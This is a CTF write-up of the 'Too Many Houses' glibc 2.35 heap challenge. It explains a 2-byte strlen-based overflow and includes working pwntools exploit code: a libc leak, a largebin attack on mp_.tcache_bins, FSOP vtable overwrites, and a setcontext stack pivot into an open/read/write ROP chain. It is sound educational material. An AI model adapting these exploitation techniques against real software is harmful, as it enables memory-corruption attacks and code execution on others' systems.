# Too Many Houses - Heap wizardry to stack pivot to arbitrary ROP chain execution

> All these talks of houses are starting to ruin the fun of the hunt, maybe you can do something about that
> 
> 0.cloud.chals.io:20887
> 
> Author: lms
> - [too_many_houses.tar.gz](https://github.com/tj-oconnor/cyber-open-2022/blob/main/pwn/house/files/too_many_houses.tar.gz)

Too Many Houses was a binary exploitation challenge in the US Cyber Open CTF in 2022, which is the first step toward qualification for the US Cyber Team. At the end of the CTF, it was worth 1000 points and had only 1 solve. I didn't solve this during the CTF, but attempted to solve during the subsequent US Cyber Combine, making use of the [writeup](https://github.com/tj-oconnor/cyber-open-2022/blob/main/pwn/house/Solution.pdf) posted after the competition. In my opinion, it was a pretty difficult challenge and I do not think I would have been able to solve it on my own. However, I think that I did learn some things from the challenge that I would like to document here.

Let's jump in!

## Overview
We're given a binary, with ld.so and libc.so.6 provided. The libc is stripped (which will be one of our biggest problems as it was compiled by the challenge author, so I'm not aware of any way to unstrip it) and from the strings, it seems that the libc is GLIBC 2.35. This is important, because there are several mitigations that were added coming up to this version:
1. Tcache pointers are encrypted, except for the head of each linked list. This means that we cannot do simple tcache poisoning without a heap leak.
2. The malloc debug hooks (`__malloc_hook`, `__free_hook`, and a few others) are no longer in use. This means that we must rely on another method, such as `__printf_arginfo_table` or the FILE struct to achieve code execution.

Examining the binary a bit more, we notice that there's a restrictive seccomp filter, only allowing us to perform a few syscalls. Most notably, we can use the `open`, `read`, and `write` syscalls, but not `execve` or `execveat`. 

Lastly, we notice the program features. This is a typical menu-based heap pwnable, with options to allocate a chunk ("Create"), edit a chunk's contents ("Edit"), print out a chunk's contents ("Print"), and free a chunk ("Delete"). We can only edit and print once.

## The Vulnerability
After reversing the program a bit, I noticed that in the function that lets you edit a chunk, we have a 2 byte overflow into the next chunk. This is because it tells the size of the chunk using `strlen()`, but the program does not put a null byte after initially reading input. Therefore, if we fill a chunk completely with non-zero bytes, we can overflow the size field of the next chunk, as the size will be considered part of the string when `strlen()` is called.

```C
void edit(void)

{
  uint idx;
  size_t __nbytes;
  
  if (edited_already != 0x737465616d706e6b) {
    FUN_00101219("You already took your shot\n");
                    /* WARNING: Subroutine does not return */
    _exit(0);
  }
  edited_already = 0;
  idx = read_index();
  print_prompt();
  __nbytes = strlen(mem[(ulong)idx * 2]);
  read(0,mem[(ulong)idx * 2],__nbytes);
  return;
}
```
However, since we can only edit a chunk once, we can only trigger the vulnerability once. That matches up with the text that is printed in the beginning of the program ("What if you only had one shot? One opportunity? Would you take it? Or would you let it slip?"), we only get one shot at triggering this vulnerability.

## Getting a leak
First of all, the program has all protections enabled except for RELRO and stack canaries. These will likely not be relevant because the binary has PIE (and we would need a program base leak to get the location of the GOT), and we do not have a stack overflow. 

ASLR is most likely enabled on the server, so the first thing we would need to do anything useful is a libc leak. This can be done with some clever heap feng shui, as I read in the writeup. 

After creating helper function wrappers for calling the four functions of the binary, I implemented this code for leaking the libc address (again, relying on the writeup).

```python
create(5, 0x1010, b"\x02"*0x400)
create(0, 0x980, b'\0'*0x28 + p64(0x1000)) # fake chunk size
create(3, 0x1030, b'\0'*0x70 + p64(0x590) + p64(0x1000)) # fake prev chunk, chunk size
create(9, 0x4000, b"Buffer") # prevent consolidation
delete(0) # chunk 0 gets put in the large? bin
create(1, 0x460, b'a') # this gets allocated out of chunk 0, but leaves the libc pointers
l = u64(leak(1) + b'\0\0')
libc.address = l - 0x1ee261
info("libc @ " + hex(libc.address))
```

The way this works is by creating multiple chunks, as well as a chunk as a buffer to prevent consolidation with the top chunk. Putting one chunk into either the unsorted or large bins by freeing it allows us to have the next allocation taken from the freed chunk. This lets us to leak the libc pointers that are not zeroed out on malloc().

## Largebin attack and FSOP
The next step outlined in the writeup is a largebin attack, targeting `mp_.tcache_bins` by overwriting it with a large value. This is done so that we can have more control over malloc() returns, as there are no checks performed when a chunk is returned from the tcachebins. In addition to this, a larger value of mp_.tcache_bins will lead to data outside of the `tcache_perthread_struct` to be used as heads of tcachebins (this is useful because the heads of tcache bins are left in their original forms, unencrypted).

We can now utilize the heap overflow to create overlapping chunks. This lets us to perform the actual largebin attack, writing the address of the largebin to our target, `mp_.tcache_bins`.

After the overwrite, we have an entry in the 0x2ff0 tcachebin pointing to the area we want to overwrite. Now we need to find something to write to. Because of the seccomp filter, we must be able to pivot to a ropchain that opens, reads, and writes the flag to stdout. In the writeup, the way that this is done is through FSOP. The vtable of the `_IO_file_plus` struct is edited so that we have control over the function pointers that are called when a FILE object is `fflush()`ed (which usually happens when the program exits).

When we allocate a chunk of the appropriate size in order to overwrite the vtable entries, and place our ropchain at an appropriate place within our input, and then use the `setcontext` gadget in libc in order to do this, because it loads all registers from the memory pointed to by `rdx`, which points to the beginning of our input.

Following what the author did in his writeup, we overwrite the `fflush` pointer in `_IO_str_jumps` with `puts`, which will call more functions so that `rdx` will eventually point to where we chose to put the beginning of our input (this will be useful later). We can also then overwrite `_IO_default_uflow` with the address of the `setcontext` gadget, which allows us to stack pivot to our ropchain (which is now at a known address as we know the libc base address, and we are overwriting data within libc).

 ```python
create(2, 0x478, b"d"*0x478) # fill the chunk completely
edit(2, b"l"*0x478 + b"\x91\x05") # overflow, making the next chunk bigger, to end inside chunk 3
create(4, 0x530, b"c"*0x500 + p64(0x510) + p64(0x1041)) # allocated out of remaining chunk 0, overlaps with chunk 3
delete(3) # this free chunk is overlapped, so we can overwrite poitners
delete(4) # move chunk 3 into largebin

tcache_bins = libc.address + 0x1ed360 + 72 # mp_.tcache_bins, allows us to treat any chunk as a tcache
                                           # this allows us to have more control over where we write
setcontext = libc.address + 0x50055 # used for stack pivot
io_helper_jumps = libc.address + 0x1ee980 # yea... stripped libc is hard

# largebin attack overwrites mp_.tcache_bins with a large value
# this chunk is at the right offset from tcache_perthread_struct to be considered the head of the 0x2ff0 tcache bin
create(6, 0x580, b"m"*312 + p64(io_helper_jumps) + b"a"*(0x500-320) + p64(0x510) + p64(0x1041) + p64(l+0x90)*3 + p64(tcache_bins))

delete(5)
create(7, 0x1060, b"c")

rop = ROP(libc) # open read write ropchain
rop.read(0, libc.bss(42), 100) # read filename
rop(rax=2, rdi=libc.bss(42), rsi=0, rdx=0) # can't use the open() function, because that uses the openat syscall
rop.raw(rop.find_gadget(["syscall", "ret"])[0])
rop.read(3, libc.bss(42), 100)
rop.write(1, libc.bss(42), 100)

print(rop.dump())
r = b"a"*160 + p64(io_helper_jumps+160) + rop.chain() # ropchain with the right padding because setcontext pops rsp

# this gets allocated out of tcache, at io_helper_jumps
# we overwrite _IO_str_jumps's fflush pointer with puts, and when puts is called, it calls _IO_default_uflow, which calls the setcontext gadget with RDX pointed to our input.
# this triggers the ropchain and prints the flag
create(8, 0x2fe0, r + b"a"*(0xc18-len(r)) + p64(setcontext) + b"a"*(3416-0xd40) + p64(libc.address + 0x81e00) + b"b"*296 + p64(libc.sym.puts))
```

With this, `rsp` gets popped from our input, and now our ropchain will be executed on the next call to `exit()`, when the stdio buffers are flushed and our overwritten function pointers are called.

## Triggering the ropchain
But hold on... The program doesn't use the normal `exit()` function! It uses the `_exit()` function, which does not `fflush()` the buffers, but instead immediately exits. This is a problem, as our whole FSOP payload would never be executed. 

However, we notice that in the beginning of the program, `alarm()` is called with a time of 32 seconds, and a handler is set that will call the normal `exit()`. This will trigger our FSOP payload, we just need to wait 32 seconds.

## Wrapping it up
After running this on the remote server, we get the flag back: `uscg{Even_1_Byte_Is_Still_Too_Much}`

Thanks to lms for a great challenge, even though my understanding is still pretty limited. This was a very cool and difficult challenge.
